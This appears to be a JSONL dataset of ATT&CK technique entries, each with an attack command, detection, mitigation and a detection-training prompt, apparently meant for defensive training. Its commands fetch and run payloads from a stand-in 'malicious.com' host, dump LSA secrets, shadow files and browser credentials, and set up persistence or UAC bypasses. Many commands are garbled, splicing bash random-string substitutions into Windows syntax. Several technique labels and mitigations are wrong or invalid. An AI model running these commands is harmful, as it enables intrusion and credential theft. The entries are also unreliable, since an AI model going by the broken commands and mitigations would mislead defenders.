{"id":40,"tactic":"Persistence","technique":"T1546.015: Component Object Model Hijacking","threat":"Hijacking COM object for persistence via registry modification.","command":"reg add \"HKCU\\Software\\Classes\\CLSID\\{$(uuidgen)}\\InprocServer32\" /ve /t REG_SZ /d \"$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)\"","detection":"Monitor COM registry: `reg query HKCU\\Software\\Classes\\CLSID /s | findstr InprocServer32`; Event ID 4657.","mitigation":"Restrict COM writes: `regini -h deny HKCU\\Software\\Classes\\CLSID`; Enable COM auditing.","references":["MITRE ATT&CK T1546.015: https://attack.mitre.org/techniques/T1546/015/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect COM hijacking and suggest registry protections."}
{"id":41,"tactic":"Privilege Escalation","technique":"T1547.005: Security Support Provider","threat":"Registering malicious SSP for privilege escalation.","command":"reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v Security Packages /t REG_MULTI_SZ /d \"$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))\"","detection":"Monitor SSP changes: `reg query \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v Security Packages`; Event ID 4657.","mitigation":"Restrict SSP modifications: `regini -h deny \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\"`; Audit LSA changes.","references":["MITRE ATT&CK T1547.005: https://attack.mitre.org/techniques/T1547/005/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect SSP tampering and suggest LSA protections."}
{"id":42,"tactic":"Defense Evasion","technique":"T1218.005: Mshta","threat":"Using mshta.exe to execute malicious HTA file from remote server.","command":"mshta http://malicious.com/$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).hta)","detection":"Monitor mshta network activity: `netstat -anp | grep mshta`; YARA rule: `rule MshtaRemote { strings: $a = /mshta.*http/ nocase; condition: $a }`","mitigation":"Block mshta network access: `netsh advfirewall firewall add rule name='Block mshta' dir=out program='%windir%\\System32\\mshta.exe' action=block`; Disable HTA execution: AppLocker.","references":["MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mshta remote execution and suggest firewall rules."}
{"id":43,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using odbcconf.exe to load malicious DLL for code execution.","command":"odbcconf /S /A {REGSVR $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)}","detection":"Monitor odbcconf: `wmic process where name='odbcconf.exe' get commandline`; Event ID 4688.","mitigation":"Restrict odbcconf: `icacls %windir%\\System32\\odbcconf.exe /deny Everyone:RX`; Require signed DLLs: AppLocker.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect odbcconf DLL loading and suggest AppLocker policies."}
{"id":44,"tactic":"Persistence","technique":"T1546.009: AppCert DLLs","threat":"Registering malicious AppCert DLL for persistence.","command":"reg add \"HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v $(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) /t REG_SZ /d \"$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)\"","detection":"Monitor AppCert DLLs: `reg query \"HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\"`; Event ID 4657.","mitigation":"Restrict AppCert writes: `regini -h deny \"HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\"`; Enable DLL auditing.","references":["MITRE ATT&CK T1546.009: https://attack.mitre.org/techniques/T1546/009/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect AppCert DLL registrations and suggest registry protections."}
{"id":45,"tactic":"Credential Access","technique":"T1552.004: Private Keys","threat":"Stealing private keys using certutil from certificate store.","command":"certutil -store my | findstr PrivateKey > $(echo keys$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor certutil: `wmic process where name='certutil.exe' get commandline | findstr store`; Event ID 4688.","mitigation":"Restrict certutil: `icacls %windir%\\System32\\certutil.exe /deny Everyone:RX`; Enable certificate store auditing.","references":["MITRE ATT&CK T1552.004: https://attack.mitre.org/techniques/T1552/004/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect certutil key extraction and suggest access controls."}
{"id":46,"tactic":"Defense Evasion","technique":"T1553.002: Code Signing","threat":"Abusing signtool.exe to sign malicious executable with stolen certificate.","command":"signtool sign /f $(echo stolen$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).pfx) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12) $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)","detection":"Monitor signtool: `wmic process where name='signtool.exe' get commandline`; Event ID 4688.","mitigation":"Restrict signtool: `icacls %windir%\\System32\\signtool.exe /deny Everyone:RX`; Secure certificate storage: `certutil -store my`.","references":["MITRE ATT&CK T1553.002: https://attack.mitre.org/techniques/T1553/002/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect signtool misuse and suggest certificate protections."}
{"id":47,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse cliconfg.exe for remote SQL payload execution.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Start-Process cliconfg.exe -ArgumentList '/S $(echo sql$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)) /E /C $(echo 'malicious' | base64 -w0)'\"","detection":"Monitor cliconfg: `wmic process where name='cliconfg.exe' get commandline`; YARA rule: `rule CliconfgExec { strings: $a = /cliconfg.*base64/ nocase; condition: $a }`","mitigation":"Restrict cliconfg: `icacls %windir%\\System32\\cliconfg.exe /deny Everyone:RX`; Disable SQL client tools: `sc delete cliconfg`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect cliconfg abuse and suggest access restrictions."}
{"id":48,"tactic":"Persistence","technique":"T1546.007: Netsh Helper DLL","threat":"Registering malicious Netsh helper DLL for persistence.","command":"netsh add helper $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)","detection":"Monitor netsh: `wmic process where name='netsh.exe' get commandline | findstr helper`; Event ID 4688.","mitigation":"Restrict netsh: `icacls %windir%\\System32\\netsh.exe /deny Everyone:RX`; Audit helper DLLs: `netsh show helper`.","references":["MITRE ATT&CK T1546.007: https://attack.mitre.org/techniques/T1546/007/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect Netsh helper DLL registrations and suggest access controls."}
{"id":49,"tactic":"Privilege Escalation","technique":"T1548.001: Setuid and Setgid","threat":"Abusing setuid binary on Linux to escalate privileges.","command":"chmod u+s $(echo /tmp/evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)) && $(echo /tmp/evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))","detection":"Monitor setuid changes: `find / -perm -4000`; Audit file changes: `auditctl -w /tmp -p wa`.","mitigation":"Remove unnecessary setuid: `chmod u-s /tmp/*`; Restrict setuid: `sysctl -w fs.protected_regular=1`.","references":["MITRE ATT&CK T1548.001: https://attack.mitre.org/techniques/T1548/001/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect setuid binary abuse and suggest file system protections."}
{"id":50,"tactic":"Defense Evasion","technique":"T1218.009: Regasm","threat":"Using regasm.exe to execute malicious assembly for code execution.","command":"regasm /codebase $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)","detection":"Monitor regasm: `wmic process where name='regasm.exe' get commandline`; Event ID 4688.","mitigation":"Restrict regasm: `icacls %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /deny Everyone:RX`; Use AppLocker for assemblies.","references":["MITRE ATT&CK T1218.009: https://attack.mitre.org/techniques/T1218/009/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect regasm assembly execution and suggest AppLocker policies."}
{"id":51,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using extrac32.exe to extract malicious CAB file for code execution.","command":"extrac32 $(echo malicious$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).cab) /Y","detection":"Monitor extrac32: `wmic process where name='extrac32.exe' get commandline`; Event ID 4688.","mitigation":"Restrict extrac32: `icacls %windir%\\System32\\extrac32.exe /deny Everyone:RX`; Monitor CAB file extraction.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect extrac32 CAB extraction and suggest access controls."}
{"id":52,"tactic":"Persistence","technique":"T1546.010: AppInit DLLs","threat":"Registering malicious AppInit DLL for persistence.","command":"reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /t REG_SZ /d \"$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)\"","detection":"Monitor AppInit: `reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs`; Event ID 4657.","mitigation":"Disable AppInit: `reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v LoadAppInit_DLLs /t REG_DWORD /d 0`; Restrict registry writes.","references":["MITRE ATT&CK T1546.010: https://attack.mitre.org/techniques/T1546/010/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect AppInit DLL registrations and suggest disabling AppInit."}
{"id":53,"tactic":"Credential Access","technique":"T1552.002: Credentials in Registry","threat":"Extracting credentials from registry using reg query.","command":"reg query HKLM\\Software\\$(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) /s | findstr password > $(echo creds$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor reg query: `wmic process where name='reg.exe' get commandline | findstr password`; Event ID 4688.","mitigation":"Encrypt registry credentials: `reg add HKLM\\Software /v password /t REG_SZ /d (ConvertTo-SecureString 'pass' -AsPlainText -Force)`; Restrict reg query.","references":["MITRE ATT&CK T1552.002: https://attack.mitre.org/techniques/T1552/002/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect registry credential extraction and suggest encryption."}
{"id":54,"tactic":"Defense Evasion","technique":"T1218.004: InstallUtil","threat":"Using InstallUtil.exe to execute malicious .NET binary.","command":"InstallUtil /U $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)","detection":"Monitor InstallUtil: `wmic process where name='InstallUtil.exe' get commandline`; Event ID 4688.","mitigation":"Restrict InstallUtil: `icacls %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /deny Everyone:RX`; Use AppLocker for .NET binaries.","references":["MITRE ATT&CK T1218.004: https://attack.mitre.org/techniques/T1218/004/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect InstallUtil execution and suggest AppLocker policies."}
{"id":55,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse wmic for remote process execution.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; wmic /node:$(echo target$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)) process call create 'powershell -c I$(echo payload | base64 -w0)'\"","detection":"Monitor wmic remote calls: `wmic process where name='wmic.exe' get commandline | findstr /node`; Event ID 4688.","mitigation":"Block wmic remote access: `netsh advfirewall firewall add rule name='Block WMIC' dir=out program='%windir%\\System32\\wbem\\wmic.exe' action=block`; Enable WMI logging.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect wmic remote execution and suggest firewall rules."}
{"id":56,"tactic":"Persistence","technique":"T1546.013: PowerShell Profile","threat":"Injecting malicious code into PowerShell profile for persistence.","command":"echo \"I$(echo 'malicious' | base64 -w0)\" >> $PROFILE.CurrentUserAllHosts","detection":"Monitor PowerShell profiles: `Get-Content $PROFILE.CurrentUserAllHosts`; File change events: Event ID 4663.","mitigation":"Restrict profile writes: `icacls $PROFILE.CurrentUserAllHosts /deny Everyone:WX`; Monitor profile modifications.","references":["MITRE ATT&CK T1546.013: https://attack.mitre.org/techniques/T1546/013/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect PowerShell profile tampering and suggest file protections."}
{"id":57,"tactic":"Privilege Escalation","technique":"T1548.004: Elevated Execution with Prompt","threat":"Bypassing UAC using eventvwr.exe for elevated execution.","command":"eventvwr && powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; I$(echo 'malicious' | base64 -w0)\"","detection":"Monitor eventvwr: `wmic process where name='eventvwr.exe' get commandline`; Event ID 4688.","mitigation":"Enable UAC: `reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1`; Restrict eventvwr: AppLocker.","references":["MITRE ATT&CK T1548.004: https://attack.mitre.org/techniques/T1548/004/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect UAC bypass via eventvwr and suggest UAC enforcement."}
{"id":58,"tactic":"Defense Evasion","technique":"T1218.007: Msiexec","threat":"Using msiexec to install malicious MSI package remotely.","command":"msiexec /quiet /i http://malicious.com/$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msi)","detection":"Monitor msiexec network activity: `netstat -anp | grep msiexec`; YARA rule: `rule MsiexecRemote { strings: $a = /msiexec.*http/ nocase; condition: $a }`","mitigation":"Block msiexec network access: `netsh advfirewall firewall add rule name='Block msiexec' dir=out program='%windir%\\System32\\msiexec.exe' action=block`; Restrict MSI execution: AppLocker.","references":["MITRE ATT&CK T1218.007: https://attack.mitre.org/techniques/T1218/007/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect msiexec remote MSI execution and suggest firewall rules."}
{"id":59,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using makecab.exe to create malicious CAB file for code execution.","command":"makecab $(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) $(echo cab$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).cab)","detection":"Monitor makecab: `wmic process where name='makecab.exe' get commandline`; Event ID 4688.","mitigation":"Restrict makecab: `icacls %windir%\\System32\\makecab.exe /deny Everyone:RX`; Monitor CAB file creation.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect makecab abuse and suggest access controls."}
{"id":60,"tactic":"Persistence","technique":"T1546.014: Emond","threat":"Abusing emond on macOS for persistence via event monitor rules.","command":"echo 'command=/bin/sh -c \"$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\"' > /etc/emond.d/rules/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).plist","detection":"Monitor emond rules: `ls /etc/emond.d/rules`; Audit file changes: `auditctl -w /etc/emond.d -p wa`.","mitigation":"Restrict emond rules: `chmod 700 /etc/emond.d`; Disable emond: `launchctl unload /System/Library/LaunchDaemons/com.apple.emond.plist`.","references":["MITRE ATT&CK T1546.014: https://attack.mitre.org/techniques/T1546/014/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect emond rule tampering and suggest access controls."}
{"id":61,"tactic":"Credential Access","technique":"T1555.003: Credentials from Web Browsers","threat":"Extracting browser credentials using esentutl.exe on Edge database.","command":"esentutl /y %localappdata%\\Microsoft\\Edge\\User Data\\Default\\Login Data /d $(echo creds$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).db)","detection":"Monitor esentutl: `wmic process where name='esentutl.exe' get commandline`; Event ID 4688.","mitigation":"Restrict esentutl: `icacls %windir%\\System32\\esentutl.exe /deny Everyone:RX`; Encrypt browser data: `reg add HKLM\\Software\\Policies\\Microsoft\\Edge /v PasswordManagerEnabled /t REG_DWORD /d 0`.","references":["MITRE ATT&CK T1555.003: https://attack.mitre.org/techniques/T1555/003/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect esentutl credential extraction and suggest browser protections."}
{"id":62,"tactic":"Defense Evasion","technique":"T1218.008: Odbcconf","threat":"Using odbcconf.exe to execute malicious RSP file.","command":"odbcconf /S /A {CONFIGSYSDSN \"$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).rsp)\"}","detection":"Monitor odbcconf RSP: `wmic process where name='odbcconf.exe' get commandline | findstr rsp`; Event ID 4688.","mitigation":"Restrict odbcconf: `icacls %windir%\\System32\\odbcconf.exe /deny Everyone:RX`; Disable RSP execution: AppLocker.","references":["MITRE ATT&CK T1218.008: https://attack.mitre.org/techniques/T1218/008/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect odbcconf RSP execution and suggest AppLocker policies."}
{"id":63,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse ldifde.exe for AD object manipulation.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; ldifde -i -f $(echo malicious$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).ldf) -s dc01\"","detection":"Monitor ldifde: `wmic process where name='ldifde.exe' get commandline`; Event ID 4688.","mitigation":"Restrict ldifde: `icacls %windir%\\System32\\ldifde.exe /deny Everyone:RX`; Audit AD changes: Event ID 5136.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect ldifde AD manipulation and suggest access controls."}
{"id":64,"tactic":"Persistence","technique":"T1546.011: Application Shimming","threat":"Registering malicious shim database for persistence.","command":"sdbinst $(echo shim$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sdb)","detection":"Monitor sdbinst: `wmic process where name='sdbinst.exe' get commandline`; Event ID 4688.","mitigation":"Restrict sdbinst: `icacls %windir%\\System32\\sdbinst.exe /deny Everyone:RX`; Audit shim installations: `reg query HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom`.","references":["MITRE ATT&CK T1546.011: https://attack.mitre.org/techniques/T1546/011/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect shim database installations and suggest access controls."}
{"id":65,"tactic":"Privilege Escalation","technique":"T1547.006: Kernel Modules and Extensions","threat":"Loading malicious kernel module on Linux for privilege escalation.","command":"insmod $(echo /tmp/evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).ko)","detection":"Monitor kernel modules: `lsmod | grep evil`; Audit module loading: `auditctl -w /sbin/insmod -p x`.","mitigation":"Restrict module loading: `echo 'kernel.modules_disabled=1' >> /etc/sysctl.conf`; Require signed modules: `modprobe --require-signatures`.","references":["MITRE ATT&CK T1547.006: https://attack.mitre.org/techniques/T1547/006/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect kernel module loading and suggest module restrictions."}
{"id":66,"tactic":"Defense Evasion","technique":"T1218.002: Control Panel","threat":"Using control.exe to execute malicious CPL file.","command":"control $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).cpl)","detection":"Monitor control.exe: `wmic process where name='control.exe' get commandline`; Event ID 4688.","mitigation":"Restrict control.exe: `icacls %windir%\\System32\\control.exe /deny Everyone:RX`; Use AppLocker for CPL files.","references":["MITRE ATT&CK T1218.002: https://attack.mitre.org/techniques/T1218/002/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect control.exe CPL execution and suggest AppLocker policies."}
{"id":67,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using ie4uinit.exe to execute malicious INF file.","command":"ie4uinit -BaseSettings $(echo malicious$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).inf)","detection":"Monitor ie4uinit: `wmic process where name='ie4uinit.exe' get commandline`; Event ID 4688.","mitigation":"Restrict ie4uinit: `icacls %windir%\\System32\\ie4uinit.exe /deny Everyone:RX`; Monitor INF file execution.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect ie4uinit INF execution and suggest access controls."}
{"id":68,"tactic":"Persistence","technique":"T1546.008: Accessibility Features","threat":"Abusing utilman.exe for persistence via replacement.","command":"copy /y $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) %windir%\\System32\\utilman.exe","detection":"Monitor utilman.exe changes: `dir %windir%\\System32\\utilman.exe /a`; Event ID 4657.","mitigation":"Restrict utilman.exe: `icacls %windir%\\System32\\utilman.exe /deny Everyone:WX`; Enable file integrity monitoring.","references":["MITRE ATT&CK T1546.008: https://attack.mitre.org/techniques/T1546/008/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect utilman.exe tampering and suggest file protections."}
{"id":69,"tactic":"Credential Access","technique":"T1003.004: LSA Secrets","threat":"Dumping LSA secrets using reg save.","command":"reg save HKLM\\Security $(echo lsa$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).hiv)","detection":"Monitor reg save: `wmic process where name='reg.exe' get commandline | findstr Security`; Event ID 4663.","mitigation":"Restrict Security hive: `regini -h deny HKLM\\Security`; Enable LSA protection: `reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 1`.","references":["MITRE ATT&CK T1003.004: https://attack.mitre.org/techniques/T1003/004/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect LSA secrets dumping and suggest LSA protections."}
{"id":70,"tactic":"Defense Evasion","technique":"T1218.001: Compiled HTML File","threat":"Using hh.exe to execute malicious CHM file.","command":"hh http://malicious.com/$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).chm)","detection":"Monitor hh.exe network activity: `netstat -anp | grep hh`; YARA rule: `rule HhRemote { strings: $a = /hh.*http/ nocase; condition: $a }`","mitigation":"Block hh.exe network access: `netsh advfirewall firewall add rule name='Block hh' dir=out program='%windir%\\hh.exe' action=block`; Disable CHM execution: AppLocker.","references":["MITRE ATT&CK T1218.001: https://attack.mitre.org/techniques/T1218/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect hh.exe CHM execution and suggest firewall rules."}
{"id":71,"tactic":"Execution","technique":"T1059.006: Python","threat":"Using Python to abuse cloud CLI (aws) for unauthorized access.","command":"python -c \"import os; os.system('aws s3 cp s3://malicious/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe . --no-sign-request')\"","detection":"Monitor aws CLI: `wmic process where name='python.exe' get commandline | findstr aws`; Audit cloud logs: AWS CloudTrail.","mitigation":"Restrict AWS CLI: `icacls %userprofile%\\.aws /deny Everyone:RX`; Require MFA: AWS IAM policies.","references":["MITRE ATT&CK T1059.006: https://attack.mitre.org/techniques/T1059/006/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect unauthorized AWS CLI execution and suggest MFA enforcement."}
{"id":72,"tactic":"Persistence","technique":"T1546.002: Screensaver","threat":"Using malicious screensaver for persistence.","command":"copy $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).scr) %windir%\\System32 && reg add \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%windir%\\System32\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).scr)\"","detection":"Monitor screensaver changes: `reg query \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE`; Event ID 4657.","mitigation":"Restrict screensaver writes: `icacls %windir%\\System32\\*.scr /deny Everyone:WX`; Disable screensavers: `reg add \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 0`.","references":["MITRE ATT&CK T1546.002: https://attack.mitre.org/techniques/T1546/002/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect malicious screensaver installations and suggest registry protections."}
{"id":73,"tactic":"Privilege Escalation","technique":"T1548.005: Temporary Elevated Cloud Access","threat":"Abusing AWS CLI to escalate privileges via temporary credentials.","command":"aws sts assume-role --role-arn arn:aws:iam::$(cat /dev/urandom | tr -dc '0-9' | head -c 12):role/$(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) --role-session-name $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)","detection":"Monitor AWS STS: `aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole`; Audit IAM logs.","mitigation":"Restrict STS assume-role: `aws iam update-assume-role-policy --role-name <role> --policy-document file://restrict.json`; Enable MFA for roles.","references":["MITRE ATT&CK T1548.005: https://attack.mitre.org/techniques/T1548/005/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect unauthorized AWS role assumptions and suggest MFA enforcement."}
{"id":74,"tactic":"Defense Evasion","technique":"T1218.012: Verclsid","threat":"Using verclsid.exe to validate malicious COM object.","command":"verclsid /S /C {$(uuidgen)} /I $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)","detection":"Monitor verclsid: `wmic process where name='verclsid.exe' get commandline`; Event ID 4688.","mitigation":"Restrict verclsid: `icacls %windir%\\System32\\verclsid.exe /deny Everyone:RX`; Audit COM objects: `reg query HKCR\\CLSID`.","references":["MITRE ATT&CK T1218.012: https://attack.mitre.org/techniques/T1218/012/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect verclsid COM validation and suggest access controls."}
{"id":75,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using wusa.exe to extract malicious CAB file for code execution.","command":"wusa $(echo malicious$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).cab) /extract:%temp%","detection":"Monitor wusa: `wmic process where name='wusa.exe' get commandline`; Event ID 4688.","mitigation":"Restrict wusa: `icacls %windir%\\System32\\wusa.exe /deny Everyone:RX`; Monitor CAB extraction.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect wusa CAB extraction and suggest access controls."}
{"id":76,"tactic":"Persistence","technique":"T1546.004: Unix Shell Configuration Modification","threat":"Injecting malicious code into bashrc for persistence on Linux.","command":"echo 'bash -c \"$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\"' >> ~/.bashrc","detection":"Monitor bashrc changes: `cat ~/.bashrc | grep bash`; Audit file changes: `auditctl -w ~/.bashrc -p wa`.","mitigation":"Restrict bashrc writes: `chmod 600 ~/.bashrc`; Monitor shell configuration changes.","references":["MITRE ATT&CK T1546.004: https://attack.mitre.org/techniques/T1546/004/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect bashrc tampering and suggest file protections."}
{"id":77,"tactic":"Credential Access","technique":"T1003.008: /etc/passwd and /etc/shadow","threat":"Extracting credentials from /etc/shadow using unshadow.","command":"unshadow /etc/passwd /etc/shadow > $(echo creds$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor unshadow: `ps aux | grep unshadow`; Audit file access: `auditctl -w /etc/shadow -p r`.","mitigation":"Restrict shadow access: `chmod 600 /etc/shadow`; Enable file auditing: `auditctl -w /etc/shadow -p wa`.","references":["MITRE ATT&CK T1003.008: https://attack.mitre.org/techniques/T1003/008/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect shadow file access and suggest file protections."}
{"id":78,"tactic":"Defense Evasion","technique":"T1218.003: CMSTP","threat":"Using cmstp.exe to execute malicious INF file.","command":"cmstp /s $(echo malicious$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).inf)","detection":"Monitor cmstp: `wmic process where name='cmstp.exe' get commandline`; Event ID 4688.","mitigation":"Restrict cmstp: `icacls %windir%\\System32\\cmstp.exe /deny Everyone:RX`; Disable INF execution: AppLocker.","references":["MITRE ATT&CK T1218.003: https://attack.mitre.org/techniques/T1218/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect cmstp INF execution and suggest AppLocker policies."}
